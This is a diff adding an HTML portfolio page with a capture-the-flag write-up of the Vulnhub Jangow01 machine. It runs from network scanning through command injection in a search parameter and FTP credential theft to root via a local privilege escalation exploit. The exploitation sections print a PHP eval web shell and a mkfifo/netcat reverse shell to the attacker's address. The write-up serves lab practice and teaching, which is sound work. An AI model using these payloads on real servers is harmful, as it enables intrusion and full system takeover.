@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF Challenge 1 - Jangow01</title>
+    <link rel="stylesheet" href="../styles.css">
+</head>
+<body>
+
+    <style>
+        img {
+             max-width: 100%;
+            height: auto;
+            }
+
+        main {
+            text-align: center;
+        }
+    </style>
+
+    <header>
+        <h1>CTF Challenge 1 - Jangow01</h1>
+    </header>
+    
+    <main>
+        <section>
+            <h2>Challenge Overview</h2>
+            <p>In this write-up I will walk you through the steps I had taken to obtain root access for the Jangow01 CTF on Vulnhub.</p>
+        </section>
+        <div class="Link">
+            <a href="https://www.vulnhub.com/entry/jangow-101,754/">Jangow01 Link</a>
+        </div>
+
+        <section>
+            <h2>Reconnaissance</h2>
+            <p>I started by running a netdiscover command to identify devices on the local network:</p>
+            <pre>netdiscover -r 192.168.0.0/24</pre>
+            <p>From the results, I located the victim machine. Validating it by navigating to 192.168.0.79 in my browser's URL field and confirmed it was hosting a website.</p>
+            <img src="../Images/Jangow01/Netdiscover.png" alt="Netdiscover">
+        </section>
+
+        <section>
+            <!-- <h2>Step 2: Scanning with Nmap</h2> -->
+            <p>Since I do see that this is a web server, I will go ahead and move forward in my recon and nmap this domain by using the following command:</p>
+            <pre>nmap -v -p- 192.168.0.79</pre>
+            <p>The results revealed that ports 21 (FTP) and 80 (HTTP) were open.</p>
+            <img src="../Images/Jangow01/Nmap.png" alt="Nmap">
+            <p>Since my results from nmap were limited I will move forward in my recon and navigate through the website to see if anything specific stands out</p>
+        </section>
+
+        <section>
+            <!-- <h2>Step 3: Exploring the Website</h2> -->
+            <p>While exploring the website, I discovered a URL parameter that allowed command injection:</p>
+            <pre><code>http://192.168.0.79/site/busque.php?buscar=</code></pre>
+            <p>Using "ls" and "pwd", I navigated through the web servers directories:</p>
+            <pre>http://192.168.0.79/site/busque.php?buscar=ls</pre>
+            <pre>http://192.168.0.79/site/busque.php?buscar=pwd</pre>
+    
+            <img src="../Images/Jangow01/pwd.png" alt="PWD">
+            <img src="../Images/Jangow01/backup.png" alt="backup">
+        </section>
+
+        <section>
+            <!--<h2>Step 4: Exploiting FTP</h2>-->
+            <p>After discovering the .backup file in the exposed directories, I extracted FTP credentials and logged into the server via my adversary machine.</p>
+            <p>Since the URL parameter is allowing me to insert command injections, I'm going to attempt to upload a shell</p>
+            <pre>echo "&lt;?php if (isset($_POST['cmd'])) { eval($_POST['cmd']); } &#62;" &#62; shell.php</pre>
+            <p>Since no error came back I was able to successfully upload my file which I was able to validate by running the "ls" command and the shell.php file being in the directory</p>
+            <p>Now that I have the file on the web server, I will go ahead and get the shell running on my adversary machine via AntSword</p>
+            <img src="../Images/Jangow01/shell.png" alt="Shell">
+        </section>
+
+        <section>
+            <h2>Weaponization, Delivery, Exploitation, & Installation</h2>
+            <p>Since I now have a shell via AntSword, I will move forward with my attack by adding a new file "rev.php"</p>
+            <p>In the rev.php files contents I will add a reverse shell to my adversary machine and send it to port 443</p>
+            <pre> &#60;?php system("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&#62;&1 | nc 192.168.0.215 443 &#62; /tmp/f"); ?&#62;</pre>
+            <p>After navigating to <code>http://192.168.0.79/site/rev.php</code>, to send the signal to my adversary machine I captured the connection using:</p>
+            <pre>nc -lvnp 443</pre>
+            <img src="../Images/Jangow01/rev.png" alt="Rev">
+        </section>
+
+        <section>
+            <h2>Command & Control (C2)</h2>
+            <p>After searching and identifying the OS as Ubuntu 16.04</p>
+            <img src="../Images/Jangow01/os.png" alt="OS">\
+            <p>I use <code>searchsploit</code> to locate a local privilege escalation exploit:</p>
+            <p>searchsploit Ubuntu 16.04</p>
+            <img src="../Images/Jangow01/searchsploit.png" alt="OS">
+            <p>After compiling and running the exploit, I gained root access:</p>
+            <pre>gcc 45010.c -o exploit</pre>
+            <pre>chmod +x exploit</pre>
+            <pre>./exploit</pre>
+            <img src="../Images/Jangow01/exploit.png" alt="Exploit">
+            <p>Actions On Objectives</p>
+        </section>
+
+        <section>
+            <h2>Conclusion</h2>
+            <p>After locating that the URL parameter allows me to input command line injections and visibly see the results, I was able to upload a shell onto the server &
+                 then escalate my privileges to root. Once I have root privileges I have full access to the system. To mitigate this issue I would advise sanitizing the malicious characters in the URL parameter.</p>
+            <p>This falls under the A01 Broken Access Control category because I was able to modify the URL & escalate my privileges</p>
+            <div class="Link">
+            <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Owasp A01 Broken Access Control</a>
+            </div>
+            <img src="../Images/Jangow01/root.png" alt="Root">
+        </section>
+
+        <div class="return-links">
+            <a href="../Images/ctf-labs.html">Return to CTFs/Labs</a> | <a href="../index.html">Return to Home Page</a>
+        </div>
+    </main>
+
+    <footer>
+        <p>&copy; 2024 David Cochran</p>
+    </footer>
+</body>
+</html>
